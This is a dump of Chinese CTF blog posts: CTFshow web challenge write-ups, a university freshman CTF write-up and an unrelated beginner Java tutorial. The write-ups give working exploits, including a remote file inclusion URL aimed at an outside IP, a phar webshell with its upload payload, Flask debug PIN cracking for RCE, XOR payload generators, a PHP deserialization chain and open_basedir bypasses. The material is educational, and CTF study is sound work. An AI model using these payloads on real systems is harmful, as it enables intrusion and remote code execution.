是一个数组，那么所有的模式都使用这个字符串进行替换。如果 `pattern` 和 `replacement` 都是数组，每个 `pattern` 使用 `replacement`中对应的元素进行替换。如果 `replacement` 中的元素比 `pattern` 中的少，多出来的 `pattern` 使用空字符串进行替换。\n>\n> `replacement` 中可以包含后向引用 `\\\\n` 或 `$n`，语法上首选后者。 每个这样的引用将被匹配到的第 n 个捕获子组捕获到的文本替换。 n 可以是0-99，`\\\\0` 和 `$0` 代表完整的模式匹配文本。捕获子组的序号计数方式为：代表捕获子组的左括号从左到右， 从1开始数。如果要在 `replacement` 中使用反斜线，必须使用 4 个(`\"\\\\\\\\\"`，译注：因为这首先是 PHP 的字符串，经过转义后，是两个，再经过正则表达式引擎后才被认为是一个原文反斜线)。\n\n此处如果将replacement中内容放入`\\\\0`那么就会直接匹配前面pattern中的结果\n\n> preg_replace中的第二个参数如果是%00也就是ascii中的0,那么将会匹配到整个字符串。\n> 比如初始的字符串为\n> $option='123';\n> 如果执行\n> preg_replace(\"$option='.*';\",\"\\x00\",$a)\n> 那么返回的结果是\n> $option='$option='123';';\n> 其实就是把原来的字符串又放到单引号里面了。\n> 假设我们第一次传option=;phpinfo();//\n> 首先config.php中的内容会被替换成$option=';phpinfo();//'。\n> 如果我们第二次传option=%00\n> 那么最终的结果是$option='$option=';phpinfo();//''\n> 这样就逃出了单引号，phpinfo()也就执行成功\n> ————————————————\n> 版权声明：本文为CSDN博主「yu22x」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n> 原文链接：https://blog.csdn.net/miuzzx/article/details/122998220\n\n**693**\n\nextract函数加远程文件包含\n\n```\n?function=extract&file=http://45.15.131.101/\n```\n\n**694**\n\n构造X-Forwarded-For请求头为文件名，file为.即可直接写入到请求头所构造的文件名中\n\n```\n/var/www/html/a.php/.\n```\n\n695\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"Java入门","url":"/posts/63f03572.html","content":"\n# JAVA\n\n**Hello World!**\n\n```java\n//Main.java\npublic class Main {\n    public static void main(String[] args) {\n        System.out.println(\"Hello world!\");\n    }\n}\n//javac Main.java\n//java Main\n//JDK 11以后支持直接使用java执行源代码\n```\n\n**JDK（Java开发工具包）组成**\n\n- JVM：Java虚拟机，java程序运行的地方\n- 核心类库：Java自带类，供程序员调用\n- JRE：Java运行环境\n\n**数据类型**\n\n基本数据类型\n\n- 整数\n  - byte    1字节\n  - short    2字节\n  - int（默认）    4字节\n  - long    8字节（整数定义时需要在数字末尾加L）\n- 浮点数\n  - float    4字节（定义时需要在数字末尾加F）\n  - double（默认）    8字节\n- 字符：char 2字节\n- 布尔：boolen\n\n引用数据类型\n\n\n\n\n\n\n\n\n\n\n\n**类型转换**\n\n默认类型转换，小的自动换成大的\n\n```java\nbyte a=1;\nbyte b=1;\nbyte c=a+b;//此处程序报错，因为ab在进行加运算前已经执行被转换成int类型\nint c=a+b;//此处正确\n```\n\n**运算符**\n\n和C++一样，字符串的优先级拉满\n\n**Java原生API**\n\n[官方文档](https://www.oracle.com/java/technologies/javase-jdk17-doc-downloads.html)\n\n**Java用户输入（练习系统API使用）**\n\n```java\nimport java.util.Scanner;//导入Scanner包\npublic class scannerDemo {\n    public static void main(String[] args) {\n        Scanner s=new Scanner(System.in);//创建一个Scanner对象\n        System.out.print(\"请输入您的年龄：\");\n        int age=s.nextInt();//获取Scanner得到的内容\n        System.out.println(\"您的年龄是：\"+age);\n    }\n}\n```\n\n**程序流程控制**\n\nif，switch，for，while和C++完全一致\n\n**Random包**\n\n```java\nimport java.util.Random;\npublic class randomDemo {\n    public static void main(String[] args) {\n        Random r=new Random();\n        int shu=r.nextInt(10);//0-9范围\n    }\n}\n```\n\n**数组**\n\n```java\n//静态初始化数组\nint[] arr={20,10,234,22,15};\nString[] name={\"PSR\",\"ZYL\",\"HZJ\"}\n//动态初始化数组\nint [] arr=new int[10]\n```\n\n动态初始化数组默认值：\n\n整型：0\n\n浮点型：0.0\n\n布尔：false\n\n引用类型：null\n\n**方法（就函数啦）**\n\n完整定义格式：\n\n```\n修饰符 返回值类型 方法名(形参){\n    方法体代码\n    return 返回值;\n}\n```\n\n```java\npublic static int sum(int a,int b){\n    int c=a+b;\n    System.out.println(\"您求的和为：\"+c);\n    return c;\n}\n```\n\n其他定义格式：\n\n可以没有返回值（void），没有参数\n\n**方法数据传递机制**\n\n基本类型参数传递：传值\n\n引用类型参数传递：传地址\n\n**方法重载**\n\n方法名一样参数不一样的方法\n\n**类**\n\n```java\npackage top.darkflow.OP;\npublic class Phone{\n    String brand;\n    double price;\n    public void start(){\n        System.out.println(\"欢迎使用\"+brand+\"手机\");\n    }\n}\n//构造器写法与C++相同\n//this关键在代表当前对象的地址\n```\n\n**JavaBean**\n\n也被称作实体类，其对象可用于在程序中封装数据\n\n要求：\n\n- 成员变量用private修饰\n- 提供对应成员变量的get与set方法\n- 必须有一个无参构造器，有参构造可有可无\n\n**String类**\n\n不可变：指原始字符串不可变，经过+运算后产生新的字符串\n\n创建方式\n\n```\nString s=new String(\"flag\");\nchar[] chars={'f','l','a','g'};\nString s=new String(chars);\nbyte[] bytes={102,108,97,103}\nString s=new String(bytes);\n```\n\n**String常用API**\n\n```\ns1.equals(s2)//比较s1，s2字符串内容是否相同equalsIgnoreCase忽略大小写\ns1.charAt(Index)//获取Index位置的字符\ns1.toCharArray()//将字符串转换为char数组\ns1.substring(head,end)//截取字符串\ns1.replace(target,replacement)//将字符串中的target用replacement替换\ns1.contains(s)//字符串中是否包含s字符串\ns1.startWiths(s)//字符串是否以s字符串开始\ns1.spilt(s)//以s为分割符来将字符串切割\n```\n\n**ArrayList**\n\n```\nArrayList list=new ArrayList()\nlist.add(ele)//向列表中添加元素（无类型限制）\nlist.add(index,ele)//向列表指定位置插入元素\n```\n\nArrayList支持泛型，可通过`ArrayList<数据类型>`来限定列表中的数据类型\n\n一些API\n\n```\nlist.get(index)//获取指定位置元素\nlist.size()//获取列表元素个数\nlist.remove(index)//删除指定位置的元素\nlist.set(index,ele)//修改指定位置的元素\n```\n\n### 面向对象咯\n\n**static关键字**\n\n- static是静态的意思，可以用来修饰成员变量和成员方法\n- static修饰成员变量表示该成员变量值在内存中储存一份，可以被共享访问修改\n- 静态成员变量常用来表示需要被共享的信息，可以被共享访问\n- 静态成员变量和方法访问时可通过`类名.成员`也可通过`对象名.成员`访问，建议通过类访问\n- 在同一个类中，访问静态方法，类名可以省略不写\n- 注意调用静态成员方法（包括通过对象调用），方法中不能调用非静态成员变量哦（如下图）\n- ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202207050029328.png)\n- 静态方法中不可以出现this关键字\n\n**静态方法应用**\n\n- 可用于构造工具类，由于不需要进行实例化，可将类的构造函数设置成私有权限\n\n**代码块**\n\n定义：花括号括起来的都是代码块\n\n- static代码块（static{}）：\n  - 属于类，与类一起优先加载（比main还快）一次，自动触发执行\n  - 作用：可以用于初始化静态资源，一边后续使用\n- 实例代码块（{}）：\n  - 属于对象，每次构建对象时，都会出发一次执行\n  - 作用：初始化实例资源\n\n**设计模式**：在开发中经常遇到的问题的最优解\n\n**单例模式**\n\n一个类只能创建一个对象\n\n```java\n//饿汉单例，在类加载时直接创造对象\npublic class danli {\n    public static danli dddd=new danli();\n    private danli(){\n        System.out.println(\"单例被创建\");\n    }\n}\n//懒汉单例，在类实例首次被调用时创造对象\npublic class danli {\n    public static danli dddd;\n    private danli(){\n        System.out.println(\"单例被创建\");\n    }\n    public static danli getInstance(){\n        if(dddd==null){\n            dddd=new danli();\n        }\n        return dddd;\n    }\n}\n```\n\n**继承**\n\n- ```\n  public class Son extends Father {}\n  ```\n\n- super关键字\n\n  - `super`可以用来引用直接父类的实例变量。\n  - `super`可以用来调用直接父类方法。\n  - `super()`可以用于调用直接父类构造函数。\n\n- 构造方法：默认先执行父类无参构造，再执行自己构造\n\n**包**\n\n- 包是用来分别管理各种不同的类的，类似文件夹，建包有利于程序的管理和维护\n- 包名语法格式：域名倒写.技术名称\n- 建包语句必须在第一行\n- 相同包下的类可直接访问，不同包下类必须导包，`import 包名.类名`\n- 如果该类中使用不同包下相同的类名，此时默认只能导入一个类的包，另一个类的要使用全名访问\n\n**权限修饰符**\n\n- 私有：`private`\n  - 只能在本类中访问\n- 缺省：啥都不加\n  - 只能本类，本包下访问\n- 保护：`protected`\n  - 本类，同包的其他类中，其他包的子类中\n- 公共：`public`\n  - 谁都能访问\n\n**final关键字**\n\n- 修饰类：表明最终类，不可被继承\n- 修饰方法：表明最终方法，不可被重写\n- 修饰变量：表明变量经过首次赋值后，不能再次被赋值\n- 常量定义：`public static final`\n\n**枚举**\n\n- 作用：为了做信息的标志和信息的分类\n\n- ```java\n  修饰符 enum 枚举名称{\n  \t第一行都是罗列枚举类实例的名称\n  }\n  ```\n\n- 枚举都继承自枚举类型：`java.lang.Enum`\n\n- 枚举类都是最终类\n\n- 构造器的构造器都是私有的，枚举对外不能创建对象\n\n- 枚举类的第一行默认都是罗列枚举对象的名称的\n\n- 枚举类相当于是多例模式\n\n- ```java\n  //枚举类的作用实例代码\n  //例如开发游戏接受用户输入的四个方向的信号\n  //如果选择常量，具有可读性但是入参值不受约束\n  //Orientation.java\n  public enum Orientation {\n      UP,DOWN,LEFT,RIGHT\n  }\n  //zhu.java\n  public class zhu {\n      public static void move(Orientation o){\n          switch (o){\n              case UP -> System.out.println(\"往上走\");\n              case DOWN ->System.out.println(\"往下走\");\n              case LEFT -> System.out.println(\"往左走\");\n              case RIGHT -> System.out.println(\"往右走\");\n          }\n      }\n      public static void main(String[] args) {\n          move(Orientation.RIGHT);\n      }\n  }\n  ```\n\n- ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202207061509169.png)\n\n**抽象**\n\n- abstract修饰的类就是抽象类，修饰的方法就是抽象方法\n\n- 写抽象方法时不能写方法体\n\n- 如果一个类中的方法被声明成为抽象方法，那么这个类必须被声明为抽象类\n\n- ```java\n  public abstract class animal {\n      public abstract void run();\n  }\n  ```\n\n- 抽象类可以理解为不完整的设计图，一般做父类\n\n- 当父类知道子类需要完成某些行为，而各个子类实现方法又不同，就把该类定义为抽象方法\n\n**接口**\n\n- ```java\n  //接口定义\n  public interface 接口名{\n  \t\t//常量\n  \t\t//抽象方法\n  }\n  ```\n\n- ```java\n  //接口实现\n  class 类名 implements 接口1,接口2...{\n  \t\t//抽象方法重写\n  }\n  ```\n\n- 接口可以多继承，一个接口可以继承多个接口\n\n- 接口不能创建对象\n\n- 一个类实现多个接口，多个接口中有同样的静态方法不冲突\n\n- 一个类继承了父类又实现了接口，父类和接口中的同名方法，默认使用父类的\n\n- 一个类实现了多个接口，多个接口中存在同名的默认方法，不冲突，这个类重写该方法即可\n\n- 一个接口继承多个接口是没有问题的，如果多个接口中存在规范冲突则不能继承\n\n- JDK8开始对接口做的新增方法\n\n  - 接口中可以有带方法实现的方法\n  - 默认方法：类似之前的普通方法，使用defalut修饰，默认用public修饰。需要用接口实现类的对象来调用\n  - 静态方法：使用static修饰，接口静态方法必须用本身的接口名来调用\n  - 私有方法：使用private修饰，只能在本类（本接口）中被其他的默认方法或者私有方法访问\n"},{"title":"CTFshowCMS","url":"/posts/478f3262.html","content":"\n**477**\n\ncmseasy 5.7，百度搜搜漏洞，有后台getshell\n\n首先/admin登录后台，admin:admin直接登录，在模版—自定义标签中写入payload\n\n```\n1111111111111\";}<?php phpinfo();?>\n```\n\n环境变量里面找吧\n\n**478**\n\nphpcms 9.6.0\n\n**479**\n"},{"title":"CUMT2022迎新","url":"/posts/5db0bb.html","content":"\n### 小学生数学题\n\n脚本\n\n```python\nimport re\nimport requests\nurl=\"http://1.117.23.177:5000/flag?calc=\"\ntex=requests.get(url).text\nsu1=re.findall(r\"<h3>num1=\\d+</h3>\",tex)\nsu2=re.findall(r\"<h3>num2=\\d+</h3>\",tex)\nnum1=su1[0][9:-5]\nnum2=su2[0][9:-5]\nnum=abs(int(num2)-int(num1))\nprint(requests.get(url+str(num)).text)\n```\n\n### 真·ezmysql\n\nSQLMAP炸库\n\n### nc\n\n如题\n\n### CumtShop\n\n买四次次东西再抢劫一次，你的钱就变负数啦，去买flag吧\n\n### Caesar\n\n凯撒位移3位\n\n### Find d\n\n如图\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206052119743.jpg)\n\n### 贝司\n\nbase64\n\n### 套！\n\n那是真的套啊\n\n新与佛论禅->Ook->BrainFuck\n\n### Lu1u 学长的秘密\n\nhint很明显了，盲水印，但是我这本地有问题，跑了三遍都跑不出来，那寄咯\n\n\n\n## 后面就是没做出来的咯\n\n### Ezpop\n\n~~听我说谢谢你，庞学长~~\n\n首先是一个小知识，在进行类内函数调用的时候可以这么调用\n\n```php\n<?php\nclass test{\n    function eval(){\n        var_dump(1);\n    }\n}\narray(new test(),\"eval\")();\n?>\n```\n\n也就是在一个数组中[0]指向一个对象，[1]指向一个对象中的函数名，再将这个数组当作函数进行，这样的话这题就简单很多了（做不出来很大一部分原因就是不知道怎么去调用隔壁类中的函数）\n\n上源码\n\n```php\n<?php\ninclude \"pass.php\";\nhighlight_file(__FILE__);\nclass user{\n    public $username;\n    public $auth;\n    function __wakeup(){\n        die(\"都说了出来打CTF要有Trick~\");\n    }\n    function __destruct(){\n        if($this->auth==true){\n            $username=$this->username;\n            echo \"hello ,\".$username();\n        }\n        else{\n            die(\"en... maybe you can try again\");\n        }\n    }\n}\n\nclass fw{\n    public $nousefuldefw;\n    public $flagg=false;\n    public $b3;\n\n    function __invoke(){\n        $this->nousefuldefw=$_POST[\"WhatIsFw\"];\n        if($this->flagg==false){\n            die(\"ok,you haved enter,but just this???\");\n        }\n        echo $this->b3->Goodgoodyouare; //c::__get\n    }\n}\n\nclass helper{\n    public $help=\"wantpeach\";\n\n    function __get($a){\n        $help=$this->help;\n        $help(\"I can help you get flag\");\n    }\n}\n\nclass controller{\n    public $passwd;\n    public $cmd;\n\n    function __wakeup(){\n        if(isset($_REQUEST[\"passwd\"])){\n            global $passwd;\n            $this->passwd=$passwd;\n        }\n        else{\n            die(\"enter password first\");\n        }\n    }\n\n    function eval(...$argv){\n        if($argv==null){\n            die(\"are you kidding me???\");\n        }\n        global $passwd;\n        if($passwd==$this->passwd){\n            printf(\"execute Your command:`\".$this->cmd).\"`\";\n            eval($this->cmd);\n        }\n        else{\n            echo \"Nonono you password is wrong so your command `\".$this->cmd.\"` can't execute!!\";\n        }\n    }\n}\n@unserialize($_REQUEST[\"data\"]);\n@var_dump($_REQUEST[\"data\"]);\n```\n\n反序列化链子还是比较明显的\n\n```php\nuser::__destruct->fw::__invoke->helper::__get->controller::eval\n```\n\n构造用的exp如下\n\n```php\n//exp.php\n<?php\nclass user\n{\n    public $username;\n    public $anth=true;\n}\nclass fw\n{\n    public $nousefuldefw=\"random\";\n    public $flagg = true;\n    public $b3;\n}\nclass helper\n{\n    public $help;\n}\nclass controller\n{\n    public $passwd=\"jlan\";\n    public $cmd=\"phpinfo();\";\n}\n$a=new user;\n$a->username=new fw;\n$a->username->b3=new helper;\n$a->username->b3->help=array(new controller,\"eval\");\necho serialize($a);\n```\n\n问题解决\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"CTFshow常用姿势","url":"/posts/eaf7f5df.html","content":"\n**801**\n\n### flask计算PIN\n\n**什么是PIN码**\n\nPIN码也就是flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式\n\n**注意事项：谨记！！python 3.8（md5）和3.6（sha1）pin码生成方式不同**\n\n**使用条件：flask debug模式开启 存在任意文件读取**\n\n首先是python PIN码的生成脚本\n\n```python\n#生效时间为一周\nPIN_TIME = 60 * 60 * 24 * 7\n\n\ndef hash_pin(pin: str) -> str:\n    return hashlib.sha1(f\"{pin} added salt\".encode(\"utf-8\", \"replace\")).hexdigest()[:12]\n\n\n_machine_id: t.Optional[t.Union[str, bytes]] = None\n\n#获取机器号\ndef get_machine_id() -> t.Optional[t.Union[str, bytes]]:\n    global _machine_id\n\n    if _machine_id is not None:\n        return _machine_id\n\n    def _generate() -> t.Optional[t.Union[str, bytes]]:\n        linux = b\"\"\n\n        # machine-id is stable across boots, boot_id is not.\n        for filename in \"/etc/machine-id\", \"/proc/sys/kernel/random/boot_id\":\n            try:\n                with open(filename, \"rb\") as f:\n                    value = f.readline().strip()\n            except OSError:\n                continue\n\n            if value:\n            #读取文件进行拼接\n                linux += value\n                break\n\n        # Containers share the same machine id, add some cgroup\n        # information. This is used outside containers too but should be\n        # relatively stable across boots.\n        try:\n            with open(\"/proc/self/cgroup\", \"rb\") as f:\n            #继续进行拼接，这里处理一下只要/docker后的东西\n                linux += f.readline().strip().rpartition(b\"/\")[2]\n        except OSError:\n            pass\n\n        if linux:\n            return linux\n\n        # On OS X, use ioreg to get the computer's serial number.\n        try:\n            # subprocess may not be available, e.g. Google App Engine\n            # https://github.com/pallets/werkzeug/issues/925\n            from subprocess import Popen, PIPE\n\n            dump = Popen(\n                [\"ioreg\", \"-c\", \"IOPlatformExpertDevice\", \"-d\", \"2\"], stdout=PIPE\n            ).communicate()[0]\n            match = re.search(b'\"serial-number\" = <([^>]+)', dump)\n\n            if match is not None:\n                return match.group(1)\n        except (OSError, ImportError):\n            pass\n\n        # On Windows, use winreg to get the machine guid.\n        if sys.platform == \"win32\":\n            import winreg\n\n            try:\n                with winreg.OpenKey(\n                    winreg.HKEY_LOCAL_MACHINE,\n                    \"SOFTWARE\\\\Microsoft\\\\Cryptography\",\n                    0,\n                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,\n                ) as rk:\n                    guid: t.Union[str, bytes]\n                    guid_type: int\n                    guid, guid_type = winreg.QueryValueEx(rk, \"MachineGuid\")\n\n                    if guid_type == winreg.REG_SZ:\n                        return guid.encode(\"utf-8\")\n\n                    return guid\n            except OSError:\n                pass\n\n        return None\n\n    _machine_id = _generate()\n    return _machine_id\n\n\nclass _ConsoleFrame:\n    \"\"\"Helper class so that we can reuse the frame console code for the\n    standalone console.\n    \"\"\"\n\n    def __init__(self, namespace: t.Dict[str, t.Any]):\n        self.console = Console(namespace)\n        self.id = 0\n\n\ndef get_pin_and_cookie_name(\n    app: \"WSGIApplication\",\n) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:\n    \"\"\"Given an application object this returns a semi-stable 9 digit pin\n    code and a random key.  The hope is that this is stable between\n    restarts to not make debugging particularly frustrating.  If the pin\n    was forcefully disabled this returns `None`.\n\n    Second item in the resulting tuple is the cookie name for remembering.\n    \"\"\"\n    pin = os.environ.get(\"WERKZEUG_DEBUG_PIN\")\n    rv = None\n    num = None\n\n    # Pin was explicitly disabled\n    if pin == \"off\":\n        return None, None\n\n    # Pin was provided explicitly\n    if pin is not None and pin.replace(\"-\", \"\").isdigit():\n        # If there are separators in the pin, return it directly\n        if \"-\" in pin:\n            rv = pin\n        else:\n            num = pin\n\n    modname = getattr(app, \"__module__\", t.cast(object, app).__class__.__module__)\n    username: t.Optional[str]\n\n    try:\n        # getuser imports the pwd module, which does not exist in Google\n        # App Engine. It may also raise a KeyError if the UID does not\n        # have a username, such as in Docker.\n        username = getpass.getuser()\n    except (ImportError, KeyError):\n        username = None\n\n    mod = sys.modules.get(modname)\n\n    # This information only exists to make the cookie unique on the\n    # computer, not as a security feature.\n    probably_public_bits = [\n        username,\n        modname,\n        getattr(app, \"__name__\", type(app).__name__),\n        getattr(mod, \"__file__\", None),\n    ]\n\n    # This information is here to make it harder for an attacker to\n    # guess the cookie name.  They are unlikely to be contained anywhere\n    # within the unauthenticated debug page.\n    private_bits = [str(uuid.getnode()), get_machine_id()]\n\n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):\n        if not bit:\n            continue\n        if isinstance(bit, str):\n            bit = bit.encode(\"utf-8\")\n        h.update(bit)\n    h.update(b\"cookiesalt\")\n\n    cookie_name = f\"__wzd{h.hexdigest()[:20]}\"\n\n    # If we need to generate a pin we salt it a bit more so that we don't\n    # end up with the same value and generate out 9 digits\n    if num is None:\n        h.update(b\"pinsalt\")\n        num = f\"{int(h.hexdigest(), 16):09d}\"[:9]\n\n    # Format the pincode in groups of digits for easier remembering if\n    # we don't have a result yet.\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = \"-\".join(\n                    num[x : x + group_size].rjust(group_size, \"0\")\n                    for x in range(0, len(num), group_size)\n                )\n                break\n        else:\n            rv = num\n\n    return rv, cookie_name\n```\n\n由上可以看得出PIN值生成所需要获取的数据有\n\n- username，用户名\n- modname，默认值为flask.app\n- appname，默认值为Flask\n- moddir，flask库下app.py的绝对路径\n- uuidnode，当前网络的mac地址的十进制数\n- machine_id，docker机器id或本机id\n\n首先是用户名\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041655129.png)\n\n可用的似乎只有root\n\n下面三项任意报错即可获得\n\nmac地址\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041659777.png)\n\nMachine_id\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041701195.png)\n\n本机生成脚本如下\n\n```python\n#MD5\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n     'flaskweb'# username\n     'flask.app',# modname\n     'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n     '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n     '25214234362297',# str(uuid.getnode()),  /sys/class/net/ens33/address\n     '0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'# get_machine_id(), /etc/machine-id\n]\n\nh = hashlib.md5()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n   h.update(b'pinsalt')\n   num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n   for group_size in 5, 4, 3:\n       if len(num) % group_size == 0:\n          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                      for x in range(0, len(num), group_size))\n          break\n       else:\n          rv = num\n\nprint(rv)\n```\n\n```python\n#sha1\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'root'# /etc/passwd\n    'flask.app',# 默认值\n    'Flask',# 默认值\n    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到\n]\n\nprivate_bits = [\n    '2485377581187',#  /sys/class/net/eth0/address 16进制转10进制\n    #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup\n    '653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'#  /proc/self/cgroup\n]\n\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\n使用最终生成的PIN进入代码调试，RCE\n\n**802**\n\n### 无字母数字命令执行\n\n异或法，偷个脚本喵喵\n\n```php\n<?php\n\n/*author yu22x*/\n\n$myfile = fopen(\"xor_rce.txt\", \"w\");\n$contents=\"\";\nfor ($i=0; $i < 256; $i++) {\n    for ($j=0; $j <256 ; $j++) {\n\n        if($i<16){\n            $hex_i='0'.dechex($i);\n        }\n        else{\n            $hex_i=dechex($i);\n        }\n        if($j<16){\n            $hex_j='0'.dechex($j);\n        }\n        else{\n            $hex_j=dechex($j);\n        }\n        $preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可\n        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){\n            echo \"\";\n        }\n\n        else{\n            $a='%'.$hex_i;\n            $b='%'.$hex_j;\n            $c=(urldecode($a)^urldecode($b));\n            if (ord($c)>=32&ord($c)<=126) {\n                $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\";\n            }\n        }\n\n    }\n}\nfwrite($myfile,$contents);\nfclose($myfile);\n\n```\n\n```python\n# -*- coding: utf-8 -*-\n\n# author yu22x\n\nimport requests\nimport urllib\nfrom sys import *\nimport os\ndef action(arg):\n   s1=\"\"\n   s2=\"\"\n   for i in arg:\n       f=open(\"xor_rce.txt\",\"r\")\n       while True:\n           t=f.readline()\n           if t==\"\":\n               break\n           if t[0]==i:\n               #print(i)\n               s1+=t[2:5]\n               s2+=t[6:9]\n               break\n       f.close()\n   output=\"(\\\"\"+s1+\"\\\"^\\\"\"+s2+\"\\\")\"\n   return(output)\n   \nwhile True:\n   param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))+\";\"\n   print(param)\n```\n\n**803**\n\n### phar文件包含\n\n来自大佬的提示：把phar当压缩包用就行\n\n首先生成包含一句话木马的phar文件\n\n```php\n<?php\n$phar = new Phar(\"phar.phar\"); //后缀名必须为phar\n$phar->startBuffering();\n$phar->setStub('<?php __HALT_COMPILER(); ?>'); //设置stub\n$phar->addFromString('test.txt', '<?php system($_POST[a]);?>'); //\n$phar->stopBuffering();\n// phar生成\n?>\n```\n\n此时phar包中的test.txt中的内容就是我们的一句话木马了\n\n上传文件（记得读取然后url编码一下）\n\n```\npayload:?file=/tmp/phar.phar&content=%3C%3Fphp+__HALT_COMPILER%28%29%3B+%3F%3E%0D%0A6%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%00%00%00%00%08%00%00%00test.txt%1A%00%00%00%7E%E7%9Db%1A%00%00%00%C8%C2%DA%2C%A4%01%00%00%00%00%00%00%3C%3Fphp+system%28%24_POST%5Ba%5D%29%3B%3F%3E%FB%C1%FC%A84J%19%C8f%97%29%BA%C7%80v%82%F5%86J%06%02%00%00%00GBMB\n```\n\ninclude干\n\n![截屏2022-06-06 20.00.48](/Users/jlan/Library/Application Support/typora-user-images/截屏2022-06-06 20.00.48.png)\n\n**804**\n\n### phar反序列化\n\n这不用教吧\n\n```php\n<?php\nclass hacker{\n    public $code;\n}\n\n// @unlink(\"phar.phar\");\n$phar = new Phar(\"phar.phar\"); //后缀名必须为phar\n// $phar = $phar->convertToExecutable(Phar::TAR, Phar::GZ); //压缩规避敏感字符\n$phar->startBuffering();\n$phar->setStub(\"GIF89a\".\"<?php __HALT_COMPILER(); ?>\"); //设置stub\n$o = new hacker();\n$o->code=\"highlight_file('flag.php');\";\n$phar->setMetadata($o); //将自定义的meta-data存入manifest\n$phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering();\n// phar生成\n\n?>\n```\n\n上传phar协议读取就行\n\n**805**\n\n### open_basedir绕过\n\n> open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。\n>\n> 假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。\n>\n> 注意：用open_basedir指定的**限制实际上是前缀，而不是目录名**。\n>\n> 文章来自[这里](https://www.cnblogs.com/hookjoy/p/12846164.html)\n\n但是这个配置对系统命令执行是没有效果的，比如执行`system('ls /')`的时候就不受限制，~~但是一般都会被ban掉~~\n\n下面就是一些bypass方法\n\n1. glob协议，只能捞捞文件名\n\n   ```php\n     $a = \"glob:///*\";\n     if ( $b = opendir($a) ) {\n       while ( ($file = readdir($b)) !== false ) {\n         echo $file.\"\\n\";\n       }\n       closedir($b);\n     }\n   ```\n\n2. 利用chdir()与ini_set()组合Bypass\n\n   原理在这里\n\n   ```php\n   mkdir(\"s\");\n   chdir('s');\n   ini_set('open_basedir','..');\n   chdir('..');\n   chdir('..');\n   chdir('..');\n   chdir('..');\n   ini_set('open_basedir','/');\n   echo file_get_contents(\"/ctfshowflag\");\n   ```\n\n3. 利用bindtextdomain()函数Bypass\n\n   这个方法也只能捞捞文件名\n\n   > **bindtextdomain()函数**\n   >\n   > (PHP 4, PHP 5, PHP 7)\n   >\n   > bindtextdomain()函数用于绑定domain到某个目录的函数。\n   >\n   > ```php\n   > bindtextdomain ( string $domain , string $directory ) : string\n   > ```\n   >\n   > bindtextdomain()函数的第二个参数\\$directory是一个文件路径，它会在\\$directory存在的时候返回\\$directory，不存在则返回false。\n\n   我们就可以通过修改directory参数根据返回值来判断文件是否存在\n\n4. 利用SplFileInfo::getRealPath()类方法Bypass\n\n   这个和上面那个很相似，也是基于报错，直接给payload吧\n\n   ```php\n   <?php\n   echo '<b>open_basedir: ' . ini_get('open_basedir') . '</b><br />';\n   $info = new SplFileInfo($_GET['dir']);\n   var_dump($info->getRealPath());\n   ?>\n   ```\n\n5. 利用realpath()函数Bypass\n\n   > ### realpath()函数\n   >\n   > (PHP 4, PHP 5, PHP 7)\n   >\n   > realpath — 返回规范化的绝对路径名。它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。\n   >\n   > 函数定义如下：\n   >\n   > ```php\n   > realpath ( string $path ) : string\n   > ```\n   >\n   > ### Bypass\n   >\n   > 环境条件：Windows\n   >\n   > 